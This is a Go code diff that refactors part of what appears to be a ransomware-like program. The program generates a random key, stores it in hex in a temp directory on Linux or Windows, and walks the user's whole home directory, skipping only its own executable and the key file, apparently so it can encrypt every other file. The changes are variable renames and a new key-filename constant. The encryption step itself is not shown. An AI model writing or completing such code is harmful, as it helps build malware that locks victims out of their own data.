@@ -16,6 +16,7 @@ const (
 	MODE_ENCRYPT = iota
 	MODE_DECRYPT
 	KEY_HEX_LENGTH = 32
+	KEY_FILENAME = "key.key"
 )
 
 func main() {
@@ -23,7 +24,7 @@ func main() {
 		key     []byte
 		mode    int
 		homeDir string
-		keyDir  string
+		keyFilePath  string
 		cipher  crypto.Cipher
 		err     error
 	)
@@ -35,9 +36,9 @@ func main() {
 
 	switch runtime.GOOS {
 	case "linux":
-		keyDir = "/tmp/"
+		keyFilePath = "/tmp/" + KEY_FILENAME
 	case "windows":
-		keyDir = homeDir + "\\AppData\\Local\\Temp\\"
+		keyFilePath = homeDir + "\\AppData\\Local\\Temp\\" + KEY_FILENAME
 	}
 
 	// Uncomment for testing
@@ -57,7 +58,7 @@ func main() {
 		key = crypto.GenerateBytes(KEY_HEX_LENGTH)
 		keyHex := hex.EncodeToString(key)
 
-		if err = files.WriteFile(keyDir+"key.key", []byte(keyHex)); err != nil {
+		if err = files.WriteFile(keyFilePath, []byte(keyHex)); err != nil {
 			return
 		}
 	}
@@ -67,16 +68,15 @@ func main() {
 		return
 	}
 
-	execPath, err := os.Executable()
+	execFilePath, err := os.Executable()
 	if err != nil {
 		return
 	}
 
-	keyFile := keyDir+"key.key"
 	var wg sync.WaitGroup
 
 	filepath.WalkDir(homeDir, func(path string, d fs.DirEntry, err error) error {
-		if err != nil || d.IsDir() || path == execPath || path == keyFile {
+		if err != nil || d.IsDir() || path == execFilePath || path == keyFilePath {
 			return nil
 		}
 
